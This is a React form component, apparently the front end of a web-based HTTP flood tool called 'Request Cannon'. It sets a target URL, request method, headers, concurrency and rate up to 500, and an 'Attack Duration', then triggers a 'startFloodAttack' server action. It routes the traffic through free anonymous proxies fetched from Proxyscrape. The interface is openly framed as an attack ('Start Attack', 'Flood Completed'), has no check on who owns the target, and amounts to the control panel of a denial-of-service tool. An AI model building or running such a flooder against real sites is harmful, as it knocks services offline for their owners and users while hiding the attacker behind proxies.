
"use client";

import { zodResolver } from "@hookform/resolvers/zod";
import { useForm } from "react-hook-form";
import { z } from "zod";
import { Button } from "@/components/ui/button";
import {
  Form,
  FormControl,
  FormDescription,
  FormField,
  FormItem,
  FormLabel,
  FormMessage,
} from "@/components/ui/form";
import { Input } from "@/components/ui/input";
import { Slider } from "@/components/ui/slider";
import { Textarea } from "@/components/ui/textarea";
import {
  Select,
  SelectContent,
  SelectItem,
  SelectTrigger,
  SelectValue,
} from "@/components/ui/select";
import { useToast } from "@/hooks/use-toast";
import { useState, useTransition } from "react";
import { startFloodAttack, fetchProxiesFromUrl, type FloodStats } from "@/app/actions";
import { ProgressDisplay } from "./progress-display";
import { Target, Users, Zap, PlayCircle, StopCircle, ArrowRightLeft, ListPlus, FileText, Timer, ShieldQuestion, Globe, DownloadCloud, Loader2 } from "lucide-react";

const HTTP_METHODS = ["GET", "POST", "PUT", "DELETE", "PATCH", "HEAD", "OPTIONS"] as const;

const formSchema = z.object({
  targetUrl: z.string().url({ message: "Please enter a valid URL (e.g., http://example.com or https://example.com)." }),
  method: z.enum(HTTP_METHODS).default("GET"),
  headers: z.string().optional(),
  body: z.string().optional(),
  proxies: z.string().optional().refine(val => {
    if (!val || val.trim() === "") return true; // Optional, so empty is fine
    // Check if all non-empty lines are valid IP:Port or IP (basic check)
    return val.split('\n').filter(line => line.trim() !== "").every(line => 
        /^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}(:\d{1,5})?$/.test(line.trim()) || // IP:Port or IP
        /^[a-zA-Z0-9-]+(\.[a-zA-Z0-9-]+)*:\d{1,5}$/.test(line.trim()) || // hostname:port
        /^http(s)?:\/\/[^:\/\s]+(:[0-9]+)?@\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}(:\d{1,5})?$/.test(line.trim()) || // user:pass@IP:Port
        /^http(s)?:\/\/[^:\/\s]+(:[0-9]+)?@[a-zA-Z0-9-]+(\.[a-zA-Z0-9-]+)*(:\d{1,5})?$/.test(line.trim()) // user:pass@hostname:port
    );
  }, { message: "One or more proxy entries are not in a recognized format (e.g., IP:PORT, HOST:PORT, or full http(s)://user:pass@host:port)." }),
  concurrency: z.coerce.number().int().min(1, "Min 1").max(500, "Max 500").default(50),
  rate: z.coerce.number().int().min(1, "Min 1").max(500, "Max 500").default(50),
  duration: z.coerce.number().int().min(5, "Min 5s").max(60, "Max 60s").default(10),
});

type FormValues = z.infer<typeof formSchema>;

const METHODS_WITH_BODY: readonly string[] = ["POST", "PUT", "PATCH"];

export function RequestCannonForm() {
  const [isFlooding, setIsFlooding] = useState(false);
  const [stats, setStats] = useState<FloodStats | null>(null);
  const [currentError, setCurrentError] = useState<string | null>(null);
  const [isPending, startTransition] = useTransition();
  const { toast } = useToast();

  const [proxyApiUrl, setProxyApiUrl] = useState<string>("https://api.proxyscrape.com/v3/free-proxy-list/get?request=displayproxies&protocol=http&proxy_format=ipport&format=text&status=alive&anonymity=elite");
  const [isFetchingProxies, setIsFetchingProxies] = useState<boolean>(false);


  const form = useForm<FormValues>({
    resolver: zodResolver(formSchema),
    defaultValues: {
      targetUrl: "",
      method: "GET",
      headers: "",
      body: "",
      proxies: "",
      concurrency: 50,
      rate: 50,
      duration: 10,
    },
  });

  const selectedMethod = form.watch("method");

  const onSubmit = (values: FormValues) => {
    if (isFlooding && isPending) { 
      toast({ title: "Flood Stop Requested", description: "The attack will complete its current duration on the server." });
      return;
    }

    setIsFlooding(true);
    setStats(null);
    setCurrentError(null);

    startTransition(async () => {
      try {
        const result = await startFloodAttack(
          values.targetUrl,
          values.method,
          values.headers,
          METHODS_WITH_BODY.includes(values.method) ? values.body : undefined,
          values.concurrency,
          values.rate,
          values.duration,
          values.proxies
        );
        setStats(result);
        if (result.error) {
          setCurrentError(result.error);
          toast({ variant: "destructive", title: "Flood Error", description: result.error });
        } else {
          toast({ title: "Flood Completed", description: `Sent ${result.totalSent} requests over ${values.duration}s. Successful: ${result.successful}, Failed: ${result.failed}.` });
        }
      } catch (error) {
        const errorMessage = error instanceof Error ? error.message : "An unexpected error occurred.";
        setCurrentError(errorMessage);
        setStats({ totalSent: 0, successful: 0, failed: 0, error: errorMessage });
        toast({ variant: "destructive", title: "Failed to Start Flood", description: errorMessage });
      } finally {
         setIsFlooding(false); 
      }
    });
  };

  const handleFetchProxies = async () => {
    if (!proxyApiUrl.trim()) {
      toast({ variant: "destructive", title: "API URL Missing", description: "Please enter a proxy API URL." });
      return;
    }
    setIsFetchingProxies(true);
    setCurrentError(null); 
    try {
      const result = await fetchProxiesFromUrl(proxyApiUrl);
      if (result.error) {
        toast({ variant: "destructive", title: "Failed to Fetch Proxies", description: result.error, duration: 5000 });
      } else if (result.proxies) {
        form.setValue("proxies", result.proxies, { shouldValidate: true });
        toast({ title: "Proxies Fetched", description: "Proxy list has been populated." });
      } else {
        toast({ variant: "destructive", title: "Failed to Fetch Proxies", description: "Received no proxies or an unexpected response.", duration: 5000 });
      }
    } catch (error) {
      const errorMessage = error instanceof Error ? error.message : "An unexpected error occurred.";
      toast({ variant: "destructive", title: "Error Fetching Proxies", description: errorMessage, duration: 5000 });
    } finally {
      setIsFetchingProxies(false);
    }
  };

  const isAttackRunning = isPending;

  return (
    <Form {...form}>
      <form onSubmit={form.handleSubmit(onSubmit)} className="space-y-8">
        <FormField
          control={form.control}
          name="targetUrl"
          render={({ field }) => (
            <FormItem>
              <FormLabel className="flex items-center"><Target className="mr-2 h-4 w-4" />Target URL</FormLabel>
              <FormControl>
                <Input placeholder="https://example.com" {...field} disabled={isAttackRunning} />
              </FormControl>
              <FormMessage />
            </FormItem>
          )}
        />

        <FormField
          control={form.control}
          name="method"
          render={({ field }) => (
            <FormItem>
              <FormLabel className="flex items-center"><ArrowRightLeft className="mr-2 h-4 w-4" />HTTP Method</FormLabel>
              <Select onValueChange={field.onChange} defaultValue={field.value} disabled={isAttackRunning}>
                <FormControl>
                  <SelectTrigger>
                    <SelectValue placeholder="Select an HTTP method" />
                  </SelectTrigger>
                </FormControl>
                <SelectContent>
                  {HTTP_METHODS.map((method) => (
                    <SelectItem key={method} value={method}>{method}</SelectItem>
                  ))}
                </SelectContent>
              </Select>
              <FormMessage />
            </FormItem>
          )}
        />

        <FormField
          control={form.control}
          name="headers"
          render={({ field }) => (
            <FormItem>
              <FormLabel className="flex items-center"><ListPlus className="mr-2 h-4 w-4" />Custom Headers (Optional)</FormLabel>
              <FormControl>
                <Textarea
                  placeholder="Content-Type: application/json\nAuthorization: Bearer token"
                  className="resize-y"
                  {...field}
                  disabled={isAttackRunning}
                />
              </FormControl>
              <FormDescription>
                Enter one header per line in Key: Value format.
              </FormDescription>
              <FormMessage />
            </FormItem>
          )}
        />

        {METHODS_WITH_BODY.includes(selectedMethod) && (
          <FormField
            control={form.control}
            name="body"
            render={({ field }) => (
              <FormItem>
                <FormLabel className="flex items-center"><FileText className="mr-2 h-4 w-4" />Request Body (Optional for {selectedMethod})</FormLabel>
                <FormControl>
                  <Textarea
                    placeholder='{"key": "value"}'
                    className="resize-y"
                    {...field}
                    disabled={isAttackRunning}
                  />
                </FormControl>
                <FormMessage />
              </FormItem>
            )}
          />
        )}
        
        <div className="space-y-2">
            <FormLabel className="flex items-center"><Globe className="mr-2 h-4 w-4 text-primary" />Proxy API URL (e.g., Proxyscrape)</FormLabel>
            <div className="flex flex-col sm:flex-row gap-2">
            <Input
                placeholder="Enter proxy list API URL"
                value={proxyApiUrl}
                onChange={(e) => setProxyApiUrl(e.target.value)}
                disabled={isAttackRunning || isFetchingProxies}
                className="flex-grow"
                aria-label="Proxy API URL"
            />
            <Button
                type="button"
                onClick={handleFetchProxies}
                disabled={isAttackRunning || isFetchingProxies || !proxyApiUrl.trim()}
                variant="outline"
                className="w-full sm:w-auto"
            >
                {isFetchingProxies ? <Loader2 className="mr-2 h-4 w-4 animate-spin" /> : <DownloadCloud className="mr-2 h-4 w-4" />}
                Fetch Proxies
            </Button>
            </div>
            <FormDescription>
            Enter a URL that returns a plain text list of proxies (one per line). Default is a Proxyscrape free HTTP endpoint.
            </FormDescription>
        </div>

        <FormField
          control={form.control}
          name="proxies"
          render={({ field }) => (
            <FormItem>
              <FormLabel className="flex items-center"><ShieldQuestion className="mr-2 h-4 w-4" />Proxy List (Optional)</FormLabel>
              <FormControl>
                <Textarea
                  placeholder="http://user:pass@host1:port\nhttp://host2:port\n..."
                  className="resize-y h-24"
                  {...field}
                  disabled={isAttackRunning}
                  aria-label="Proxy List"
                />
              </FormControl>
              <FormDescription>
                Enter one proxy URL per line (e.g., IP:PORT, HOST:PORT, or full http(s)://user:pass@host:port). Can be auto-populated using the API URL field above.
              </FormDescription>
              <FormMessage />
            </FormItem>
          )}
        />


        <FormField
          control={form.control}
          name="concurrency"
          render={({ field: { onChange, value, ...restField } }) => (
            <FormItem>
              <FormLabel className="flex items-center"><Users className="mr-2 h-4 w-4" />Concurrent Requests: {value}</FormLabel>
              <FormControl>
                <Slider
                  defaultValue={[value]}
                  min={1}
                  max={500}
                  step={1}
                  onValueChange={(vals) => onChange(vals[0])}
                  disabled={isAttackRunning}
                  aria-label="Concurrent Requests"
                  {...restField}
                />
              </FormControl>
              <FormMessage />
            </FormItem>
          )}
        />

        <FormField
          control={form.control}
          name="rate"
          render={({ field: { onChange, value, ...restField } }) => (
            <FormItem>
              <FormLabel className="flex items-center"><Zap className="mr-2 h-4 w-4" />Request Rate (RPS): {value}</FormLabel>
              <FormControl>
                <Slider
                  defaultValue={[value]}
                  min={1}
                  max={500}
                  step={1}
                  onValueChange={(vals) => onChange(vals[0])}
                  disabled={isAttackRunning}
                  aria-label="Request Rate"
                  {...restField}
                />
              </FormControl>
              <FormMessage />
            </FormItem>
          )}
        />

        <FormField
          control={form.control}
          name="duration"
          render={({ field: { onChange, value, ...restField } }) => (
            <FormItem>
              <FormLabel className="flex items-center"><Timer className="mr-2 h-4 w-4" />Attack Duration (seconds): {value}</FormLabel>
              <FormControl>
                <Slider
                  defaultValue={[value]}
                  min={5}
                  max={60}
                  step={1}
                  onValueChange={(vals) => onChange(vals[0])}
                  disabled={isAttackRunning}
                  aria-label="Attack Duration"
                  {...restField}
                />
              </FormControl>
              <FormMessage />
            </FormItem>
          )}
        />
        
        <Button 
          type="submit" 
          className="w-full" 
          disabled={isAttackRunning}
          variant={isAttackRunning ? "destructive" : "default"}
        >
          {isAttackRunning ? <StopCircle className="mr-2 h-4 w-4 animate-pulse" /> : <PlayCircle className="mr-2 h-4 w-4" />}
          {isAttackRunning ? "Attack in Progress..." : "Start Attack"}
        </Button>
      </form>

      {(isFlooding || isPending || stats || currentError) && (
        <div className="mt-8">
          <ProgressDisplay
            isLoading={isPending}
            stats={stats}
            error={currentError || (stats?.error ?? null)}
          />
        </div>
      )}
    </Form>
  );
}

